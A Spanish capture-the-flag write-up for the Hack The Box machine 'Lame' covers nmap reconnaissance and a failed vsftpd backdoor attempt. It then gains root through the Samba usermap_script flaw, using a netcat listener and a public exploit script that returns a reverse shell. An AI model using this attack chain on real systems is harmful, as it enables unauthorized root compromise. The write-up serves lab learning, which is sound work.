Lame // Linux // Easy // HTB


Fase de reconocimiento


Primero procedo a hacer un análisis de puertos con nmap hacia el servidor:


sudo nmap -sS -p- --open --min-rate 5000 10.129.192.172 -Pn -oA Lame-recon

  • -sS: Especifico el uso de un escaneo SYN (half-open)
  • -p-: Indico que quiero escanear todo el rango de puertos
  • --open: Esto me filtra solo por los puertos abiertos
  • --min-rate 5000: Esto hace que el escaneo sea más rápido
  • -Pn: Esto hace que no haga ping por lo que acelera el escaneo
  • -oA Lame-recon: Guarda el resultado del escaneo en un archivo llamado Lame-recon, y de esta forma se puede revisar el resultado posteriormente


El resultado del escaneo muestra que se encuentran abiertos los puertos 21,22,139 y el 445, por lo que procedo a hacer un escaneo más profundo en estos puertos para ver si hay versiones vulnerables:


nmap -sCV -p 21,22,139,445 10.129.192.172 -oN Versions

  • -sCV: Especifico que quiero hacer un escaneo de scripts básicos de Nmap (C) y de versiones (V)
  • -p 21,22,139,445: Indico que quiero escanear solo los puertos 21,22,139 y 445
  • -oN Versions: Guarda el resultado del escaneo en un archivo llamado Versions, y de esta forma se puede revisar el resultado posteriormente

El resultado del escaneo muestra que el puerto 21 tiene un servicio vsftpd 2.3.4, el puerto 22 tiene un servicio SSH y el puerto 139 y 445 tienen servicios SMB con una version 3.0.20, por lo que procedo a confirmar con searchsploit si hay alguna vulnerabilidad conocida para el servicio vsftpd 2.3.4 y efectivamente hay una vulnerabilidad de backdoor que permite obtener una shell remota.


Al intentar explotar la vulnerabilidad no logro obtener el acceso debido a una restricción del firewall.


Ahora lo que procedo a hacer es revisar si smb tiene alguna vulnerabilidad conocida.


Explotación

Al investigar sobre la vulnerabilidad de SMB, veo que es una vulnerabilidad crítica de RCE (Remote Code Execution) por lo que puede servir para lo que estoy buscando.


Al buscar en internet, encuentro un github el cual contiene una exploit para esta vulnerabilidad el cual puede ser de utilidad.

Pero antes de ejecutar el exploit, debemos crear un venv de Python ya que debemos instalar el módulo pysmb:

$ python3 -m venv smb_exploit
$ source smb_exploit/bin/activate
$ pip install pysmb

Una vez instalado el módulo, configuramos una escucha con ncat:

$ nc -lvnp 4444

Después de configurar la escucha, ejecutamos el exploit:

$ python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>

Una vez ejecutado el exploit, se obtiene una shell reversa en la escucha configurada con acceso root.

Si se desea operar de una manera más cómoda, puede intentar sanitizar la terminal a como he mostrado otras veces en publicaciones de instagram: Cómo sanitizan sus terminales?

O puede revisar la publicación en mi blog: Sanitizar Terminal


Como ya tenemos acceso a root, solo tenemos que explorar el sistema de archivos para encontrar las flags y completar el reto.
